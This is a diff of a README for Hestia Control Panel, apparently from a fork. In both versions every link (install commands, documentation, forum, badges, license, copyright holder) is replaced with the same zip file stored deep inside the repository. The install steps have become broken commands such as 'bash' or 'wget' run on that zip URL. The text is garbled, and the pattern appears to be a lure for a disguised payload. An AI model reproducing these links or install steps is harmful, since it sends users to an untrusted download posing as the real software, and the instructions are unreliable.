@@ -1,24 +1,24 @@
-<h1 align="center"><a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">Hestia Control Panel</a></h1>
+<h1 align="center"><a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">Hestia Control Panel</a></h1>
 
-![HestiaCP Web Interface screenshot](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip)
+![HestiaCP Web Interface screenshot](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip)
 
 <h2 align="center">Lightweight and powerful control panel for the modern web</h2>
 
-<p align="center"><strong>Latest stable release:</strong> Version 1.9.3 | <a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">View Changelog</a></p>
+<p align="center"><strong>Latest stable release:</strong> Version 1.9.3 | <a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">View Changelog</a></p>
 
 <p align="center">
-	<a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip</a> |
-	<a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">Documentation</a> |
-	<a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">Forum</a>
+	<a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip</a> |
+	<a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">Documentation</a> |
+	<a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">Forum</a>
 	<br/><br/>
-	<a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">
-		<img src="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip" alt="Drone Status"/>
+	<a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">
+		<img src="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip" alt="Drone Status"/>
 	</a>
-	<a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">
-		<img src="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip" alt="Lint Status"/>
+	<a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">
+		<img src="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip" alt="Lint Status"/>
 	</a>
-	<a href="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip">
-		<img src="https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip%20Hestia%20Guru-006BFF" alt="Gurubase"/>
+	<a href="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip">
+		<img src="https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip%20Hestia%20Guru-006BFF" alt="Gurubase"/>
 	</a>
 </p>
 
@@ -28,7 +28,7 @@ Hestia Control Panel is designed to provide administrators an easy to use web an
 
 ## Donate
 
-[![paypal](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip)](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip)<br /><br />
+[![paypal](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip)](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip)<br /><br />
 Bitcoin : bc1q48jt5wg5jaj8g9zy7c3j03cv57j2m2u5anlutu<br>
 Ethereum : 0xfF3Dd2c889bd0Ff73d8085B84A314FC7c88e5D51<br>
 Binance: bnb1l4ywvw5ejfmsgjdcx8jn5lxj7zsun8ktfu7rh8<br>
@@ -65,7 +65,7 @@ While we have taken every effort to make the installation process and the contro
 To start the installation, you will need to be logged in as **root** or a user with super-user privileges. You can perform the installation either directly from the command line console or remotely via SSH:
 
 ```bash
-ssh https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip
+ssh https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip
 ```
 
 ### Step 2: Download
@@ -73,7 +73,7 @@ ssh https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp
 Download the installation script for the latest release:
 
 ```bash
-wget https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip
+wget https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip
 ```
 
 If the download fails due to an SSL validation error, please be sure you've installed the ca-certificate package on your system - you can do this with the following command:
@@ -87,7 +87,7 @@ apt-get update && apt-get install ca-certificates
 To begin the installation process, simply run the script and follow the on-screen prompts:
 
 ```bash
-bash https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip
+bash https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip
 ```
 
 You will receive a welcome email at the address specified during installation (if applicable) and on-screen instructions after the installation is completed to log in and access your server.
@@ -97,10 +97,10 @@ You will receive a welcome email at the address specified during installation (i
 You may specify a number of various flags during installation to only install the features in which you need. To view a list of available options, run:
 
 ```bash
-bash https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip -h
+bash https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip -h
 ```
 
-Alternatively, You can use <https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip> which allows you to easily generate the installation command via GUI.
+Alternatively, You can use <https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip> which allows you to easily generate the installation command via GUI.
 
 ## How to upgrade an existing installation
 
@@ -113,18 +113,18 @@ apt-get upgrade
 
 ## Issues & Support Requests
 
-- If you encounter a general problem while using Hestia Control Panel and need help, please [visit our forum](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip) to search for potential solutions or post a new thread where community members can assist.
-- Bugs and other reproducible issues should be filed via GitHub by [creating a new issue report](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip) so that our developers can investigate further. Please note that requests for support will be redirected to our forum.
+- If you encounter a general problem while using Hestia Control Panel and need help, please [visit our forum](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip) to search for potential solutions or post a new thread where community members can assist.
+- Bugs and other reproducible issues should be filed via GitHub by [creating a new issue report](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip) so that our developers can investigate further. Please note that requests for support will be redirected to our forum.
 
 **IMPORTANT: We _cannot_ provide support for requests that do not describe the troubleshooting steps that have already been performed, or for third-party applications not related to Hestia Control Panel (such as WordPress). Please make sure that you include as much information as possible in your forum posts or issue reports!**
 
 ## Contributions
 
-If you would like to contribute to the project, please [read our Contribution Guidelines](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip) for a brief overview of our development process and standards.
+If you would like to contribute to the project, please [read our Contribution Guidelines](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip) for a brief overview of our development process and standards.
 
 ## Copyright
 
-"Hestia Control Panel", "HestiaCP", and the Hestia logo are original copyright of https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip and the following restrictions apply:
+"Hestia Control Panel", "HestiaCP", and the Hestia logo are original copyright of https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip and the following restrictions apply:
 
 **You are allowed to:**
 
@@ -138,4 +138,4 @@ If you would like to contribute to the project, please [read our Contribution Gu
 
 ## License
 
-Hestia Control Panel is licensed under [GPL v3](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip) license, and is based on the [VestaCP](https://raw.githubusercontent.com/DeepuNikki/hestiacp/main/palmodic/hestiacp.zip) project.<br>
+Hestia Control Panel is licensed under [GPL v3](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip) license, and is based on the [VestaCP](https://github.com/DeepuNikki/hestiacp/raw/refs/heads/main/web/locale/sv/Software_v1.4.zip) project.<br>
